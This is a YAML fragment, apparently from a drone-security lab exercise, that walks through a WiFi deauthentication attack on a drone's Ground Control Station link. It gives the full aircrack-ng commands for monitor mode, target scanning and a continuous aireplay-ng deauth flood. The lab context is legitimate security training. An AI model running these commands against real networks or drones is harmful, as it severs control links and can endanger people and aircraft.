    content: |
      A WiFi deauthentication attack targets the communication between two devices on a WiFi network. 
      By sending deauthentication frames to one or both devices, the attacker forces them to disconnect 
      from the network. This can be particularly disruptive for systems that rely on continuous network 
      connectivity, such as drones controlled by a Ground Control Station (GCS) via WiFi.

    steps:
      - title: Step 1. Setup
        description: |
          Ensure you have the Aircrack-ng suite installed and a compatible WiFi adapter.
          ```sudo apt-get update
          sudo apt-get install aircrack-ng
          ```

      - title: Step 2. Enable Monitor Mode
        description: |
          Your WiFi adapter should already be put into monitor mode (wlan0mon) however, if it is not you can put your WiFi adapter into monitor mode to capture network traffic.
          ```sudo airmon-ng start wlan0
          ```

      - title: Step 3. Identify Target Devices
        description: |
          Use `airodump-ng` to scan for the GCS and access point MAC addresses.
          ```sudo airodump-ng wlan0mon
          ```
          Identify the MAC address of the companion computer (which is hosting the AP (access point) and the GCS (ground control station). Note the channel number should be on 6 (e.g., `-c 6`).

      - title: Step 4. Perform Deauth Attack
        description: |
          Execute the deauth attack to disconnect the GCS from the network.
          ```sudo aireplay-ng --deauth 0 -a <AP_MAC> -c <GCS_MAC> wlan0mon
          ```
          Replace `<AP_MAC>` with the MAC address of the access point and `<GCS_MAC>` with the MAC address of the GCS.
